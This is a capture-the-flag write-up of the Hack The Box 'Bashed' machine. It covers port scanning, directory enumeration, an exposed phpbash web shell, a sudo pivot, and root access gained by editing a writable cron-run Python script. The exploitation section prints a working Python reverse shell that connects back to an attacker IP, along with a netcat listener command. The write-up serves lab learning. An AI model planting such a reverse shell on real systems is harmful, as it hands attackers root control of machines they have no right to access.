## Overview

Bashed is an easy Linux machine from Hack The Box focused on web enumeration, command execution, privilege escalation through `sudo`, and the abuse of a writable Python script executed periodically with root privileges.

The initial foothold was obtained through an exposed `phpbash` web shell, which allowed command execution as the `www-data` user. After enumerating the system, `sudo` permissions allowed a pivot to the `scriptmanager` user.

During privilege escalation, a script inside `/scripts` was found to be writable and periodically executed with root privileges. By modifying the script and inserting a Python reverse shell, a root shell was obtained.

### Attack Path

```text
Port Scanning
      ↓
Web Enumeration
      ↓
Exposed phpbash Web Shell
      ↓
www-data
      ↓
sudo -l
      ↓
scriptmanager
      ↓
Writable /scripts/test.py
      ↓
Root Cron Job
      ↓
Python Reverse Shell
      ↓
root
```

---

## Reconnaissance

### Port Scanning

The first step was to enumerate all TCP ports:

```bash
nmap -p- --min-rate 5000 10.129.38.61
```

<img width="954" height="119" alt="nmap-bashed" src="https://github.com/user-attachments/assets/8c61d1ab-735c-4285-819d-717d868ba2ee" />


The scan revealed an HTTP service running on port 80.

A more detailed scan was then performed:

```bash
nmap -sC -sV -p80 10.129.38.61
```

The results confirmed that a web server was running on the target.

---

## Web Enumeration

After navigating to the web service, directory enumeration was performed:

```bash
gobuster dir -u http://10.129.38.61 -w /usr/share/wordlists/dirb/common.txt
```

During enumeration, the following directory was discovered:

```text
/dev/
```

Further investigation of this directory revealed an exposed `phpbash` web shell.

---

## Initial Access

### phpbash

`phpbash` is a browser-based shell that allows commands to be executed directly on the target system.

Using the exposed shell, I was able to execute commands on the machine.

The current user was identified with:

```bash
whoami
```

```text
www-data
```

This provided the initial foothold as the low-privileged web server account.

At this point, I began enumerating the system and searching for privilege escalation opportunities.

---

## Privilege Escalation

### Enumerating sudo Permissions

The first privilege escalation step was checking the current user's `sudo` permissions:

```bash
sudo -l
```

The output revealed that `www-data` had permission to execute commands as the `scriptmanager` user.

This allowed me to switch users:

```bash
sudo -u scriptmanager bash
```

<img width="955" height="34" alt="scriptmanager-bashed" src="https://github.com/user-attachments/assets/62e0c6e7-5d93-4625-b5d5-abf710ccfc25" />


The new user was confirmed with:

```bash
whoami
```

```text
scriptmanager
```

---

### Enumerating the Filesystem

After obtaining access as `scriptmanager`, I inspected the filesystem:

```bash
ls -la /
```

A directory named `/scripts` was discovered.

Inside the directory, the following Python script was found:

```text
/scripts/test.py
```

The script was writable by the current user.

This was immediately interesting because a writable script can become a privilege escalation vector if it is executed by a more privileged user.

---

## Cron Job Enumeration

I then inspected the system's scheduled tasks:

```bash
cat /etc/crontab
```

The results showed that `test.py` was being executed periodically with root privileges.

This created the following attack path:

```text
scriptmanager
      ↓
Can modify /scripts/test.py
      ↓
test.py is executed periodically
      ↓
The script runs as root
      ↓
Insert reverse shell
      ↓
Receive root shell
```

The vulnerability was therefore caused by a combination of:

* A script writable by a low-privileged user.
* A scheduled task executing that script.
* The scheduled task running with root privileges.

---

## Exploiting the Writable Python Script

Since `test.py` was writable and executed by a root-owned scheduled task, I modified the script to establish a reverse shell back to my attacking machine.

The Python payload used was:

```python
import socket, subprocess, os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.10.14.44", 4444))

os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)

p = subprocess.call(["/bin/sh", "-i"])
```

The IP address was configured to point to my attacking machine.

I then started a Netcat listener:

```bash
nc -lvnp 4444
```

Once the cron job executed the modified script, the reverse shell connected back to my machine.

---

<img width="956" height="127" alt="root-bashed" src="https://github.com/user-attachments/assets/a365ad3d-847b-4837-910e-d62d04c13b19" />


## Root Access

After receiving the shell, I verified the current user:

```bash
whoami
```

```text
root
```

The machine was successfully compromised.

---

## Flags

```text
User Flag:
<REDACTED>

Root Flag:
<REDACTED>
```

---

## Key Takeaways

### Initial Access

* Perform complete web enumeration.
* Do not ignore unusual directories such as `/dev`.
* Exposed web shells can provide immediate command execution.
* Always identify the current user after obtaining a shell.

### Privilege Escalation

* Always check `sudo -l`.
* Look for opportunities to switch to other users.
* Enumerate the filesystem after obtaining a new user.
* Search for writable files executed by privileged users.
* Inspect cron jobs and scheduled tasks.
* Writable scripts executed by root can lead directly to full system compromise.

---

## Important Commands

```bash
# Full TCP port scan
nmap -p- --min-rate 5000 10.129.38.61

# Service enumeration
nmap -sC -sV -p80 10.129.38.61

# Directory enumeration
gobuster dir -u http://10.129.38.61 -w /usr/share/wordlists/dirb/common.txt

# Identify current user
whoami

# Check sudo permissions
sudo -l

# Switch to scriptmanager
sudo -u scriptmanager /bin/bash

# Inspect cron jobs
cat /etc/crontab

# Start reverse shell listener
nc -lvnp 4444
```

---

## Conclusion

Bashed was a great machine for reinforcing the importance of systematic enumeration.

The complete attack path was:

```text
Exposed phpbash Web Shell
          ↓
       www-data
          ↓
       sudo -l
          ↓
    scriptmanager
          ↓
Writable /scripts/test.py
          ↓
   Root Cron Job
          ↓
 Python Reverse Shell
          ↓
         root
```

The main lesson from this machine is that privilege escalation does not always require exploiting a software vulnerability.

Misconfigured file permissions combined with scheduled tasks can be equally dangerous. If a low-privileged user can modify a script that is automatically executed with root privileges, that script can become a direct path to full system compromise.
